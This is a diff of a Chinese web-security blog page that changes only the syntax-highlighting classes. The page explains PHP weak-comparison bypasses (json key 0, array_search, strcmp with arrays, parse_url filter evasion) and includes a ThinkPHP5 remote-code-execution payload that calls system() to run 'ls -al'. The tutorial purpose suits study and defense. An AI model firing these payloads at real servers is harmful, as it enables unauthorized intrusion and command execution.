@@ -89,7 +89,7 @@
 
 <h3 id="弱类型">弱类型</h3>
 
-<p>  php的<code class="highlighter-rouge">'==='</code>与<code class="highlighter-rouge">==</code>是截然不同的,<code class="highlighter-rouge">===</code>会在判断前首先比较两变量类型,然后进行值的比较,但是<code class="highlighter-rouge">==</code>则强制转换为相同的类型,然后进行比较.</p>
+<p>  php的<code class="language-plaintext highlighter-rouge">'==='</code>与<code class="language-plaintext highlighter-rouge">==</code>是截然不同的,<code class="language-plaintext highlighter-rouge">===</code>会在判断前首先比较两变量类型,然后进行值的比较,但是<code class="language-plaintext highlighter-rouge">==</code>则强制转换为相同的类型,然后进行比较.</p>
 
 <blockquote>
   <p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
@@ -113,7 +113,7 @@
 
 <p>  md5-hash碰撞</p>
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="nv">$logined</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
     <span class="nv">$Username</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">];</span>
     <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
@@ -138,10 +138,10 @@
 <p>  json绕过</p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]))</span> <span class="p">{</span>
     <span class="nv">$message</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'message'</span><span class="p">]);</span>
     <span class="nv">$key</span> <span class="o">=</span><span class="s2">"*********"</span><span class="p">;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$message</span><span class="o">-&gt;</span><span class="na">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$message</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">"flag"</span><span class="p">;</span>
     <span class="p">}</span> 
     <span class="k">else</span> <span class="p">{</span>
@@ -154,7 +154,7 @@
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>  我们并不知道$key的值,但是当<code class="highlighter-rouge">$message-&gt;key</code>为整数时,$key也会被转化为整数,因此构造payload如下:</p>
+<p>  我们并不知道$key的值,但是当<code class="language-plaintext highlighter-rouge">$message-&gt;key</code>为整数时,$key也会被转化为整数,因此构造payload如下:</p>
 
 <pre><code class="language-plain">message={"key":0}
 </code></pre>
@@ -180,14 +180,14 @@
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>  <code class="highlighter-rouge">array_search()</code>这个函数在php Manual手册中写道:</p>
+<p>  <code class="language-plaintext highlighter-rouge">array_search()</code>这个函数在php Manual手册中写道:</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">mixed</span> <span class="nb">array_search</span> <span class="p">(</span> <span class="nx">mixed</span> <span class="nv">$needle</span> <span class="p">,</span> <span class="k">array</span> <span class="nv">$haystack</span> <span class="p">[,</span> <span class="nx">bool</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]</span> <span class="p">);</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mixed</span> <span class="nb">array_search</span> <span class="p">(</span> <span class="n">mixed</span> <span class="nv">$needle</span> <span class="p">,</span> <span class="k">array</span> <span class="nv">$haystack</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$strict</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]</span> <span class="p">);</span>
 </code></pre></div></div>
 
-<p>  在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为<code class="highlighter-rouge">==</code>,因此payload如下:</p>
+<p>  在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为<code class="language-plaintext highlighter-rouge">==</code>,因此payload如下:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test[]=0
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test[]=0
 </code></pre></div></div>
 <blockquote>
   <p>同样in_array()也有此漏洞</p>
@@ -197,10 +197,10 @@
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
     <span class="nv">$password</span><span class="o">=</span><span class="s2">"***************"</span>
-     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
+     <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])){</span>
 
         <span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-            <span class="k">echo</span> <span class="s2">"Right!!!login success"</span><span class="p">;</span><span class="nx">n</span>
+            <span class="k">echo</span> <span class="s2">"Right!!!login success"</span><span class="p">;</span><span class="n">n</span>
             <span class="k">exit</span><span class="p">();</span>
         <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
             <span class="k">echo</span> <span class="s2">"Wrong password.."</span><span class="p">;</span>
@@ -208,7 +208,7 @@
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>  strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入<code class="highlighter-rouge">password[]=xx</code>来进行绕过.</p>
+<p>  strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入<code class="language-plaintext highlighter-rouge">password[]=xx</code>来进行绕过.</p>
 
 <blockquote>
   <p>同样md5() sha1()等函数也存在类似漏洞.</p>
@@ -244,7 +244,7 @@
 
 <h4 id="parse_url">parse_url()</h4>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">parse_url</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$url</span> <span class="p">[,</span> <span class="nx">int</span> <span class="nv">$component</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">mixed</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">parse_url</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$url</span> <span class="p">[,</span> <span class="n">int</span> <span class="nv">$component</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> <span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="n">mixed</span>
 </code></pre></div></div>
 
 <p>  该函数解析URL，并返回其组成部分。其返回值为一个关联数组。该函数常用于获取url中的相关字段。例如：</p>
@@ -261,7 +261,7 @@
 <span class="nv">$filter</span><span class="o">=</span><span class="p">[</span><span class="s2">"cache"</span><span class="p">,</span> <span class="s2">"binarycloud"</span><span class="p">];</span> 
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$filter</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span>
 <span class="p">{</span> 
-        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">"/i"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]))</span>
+        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/"</span><span class="mf">.</span><span class="nv">$f</span><span class="mf">.</span><span class="s2">"/i"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]))</span>
         <span class="p">{</span> 
                 <span class="k">die</span><span class="p">(</span><span class="s2">"Attack Detected"</span><span class="p">);</span> 
         <span class="p">}</span> 
@@ -269,12 +269,12 @@
 <span class="cp">?&gt;</span>
 </code></pre></div></div>
 
-<p>正常情况下我们<code class="highlighter-rouge">curl "127.0.0.1/a.php?/cache"</code>会被检测到，这个时候一个通用的绕过方式为：</p>
+<p>正常情况下我们<code class="language-plaintext highlighter-rouge">curl "127.0.0.1/a.php?/cache"</code>会被检测到，这个时候一个通用的绕过方式为：</p>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"127.0.0.1//a.php?/cache"</span>
 </code></pre></div></div>
 
-<p>这时<code class="highlighter-rouge">a.php?/cache</code>会被当作data[‘path’]，而不再是query，导致绕过过滤。假如payload为<code class="highlighter-rouge">///a.php?/cache</code>那么parse_url()会返回False，也可以绕过过滤。</p>
+<p>这时<code class="language-plaintext highlighter-rouge">a.php?/cache</code>会被当作data[‘path’]，而不再是query，导致绕过过滤。假如payload为<code class="language-plaintext highlighter-rouge">///a.php?/cache</code>那么parse_url()会返回False，也可以绕过过滤。</p>
 
 <h3 id="thinkphp5-rce">Thinkphp5 rce</h3>
 <p>  不再分析原理，直接总结payload：</p>
@@ -319,9 +319,9 @@ http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;functi
 
 <p>2019.1.11爆出的漏洞：</p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">s\captcha</span>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">index</span><span class="mf">.</span><span class="n">php</span><span class="o">?</span><span class="n">s\captcha</span>
 
-<span class="nx">_method</span><span class="o">=</span><span class="nx">__construct</span><span class="o">&amp;</span><span class="nx">filter</span><span class="p">[]</span><span class="o">=</span><span class="nb">system</span><span class="o">&amp;</span><span class="nx">method</span><span class="o">=</span><span class="nx">get</span><span class="o">&amp;</span><span class="nx">server</span><span class="p">[</span><span class="nx">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="nx">ls</span> <span class="o">-</span><span class="nx">al</span>
+<span class="n">_method</span><span class="o">=</span><span class="n">__construct</span><span class="o">&amp;</span><span class="n">filter</span><span class="p">[]</span><span class="o">=</span><span class="n">system</span><span class="o">&amp;</span><span class="n">method</span><span class="o">=</span><span class="n">get</span><span class="o">&amp;</span><span class="n">server</span><span class="p">[</span><span class="no">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
 </code></pre></div></div>
 
 <p>分析文章来自<a href="http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">这里</a></p>
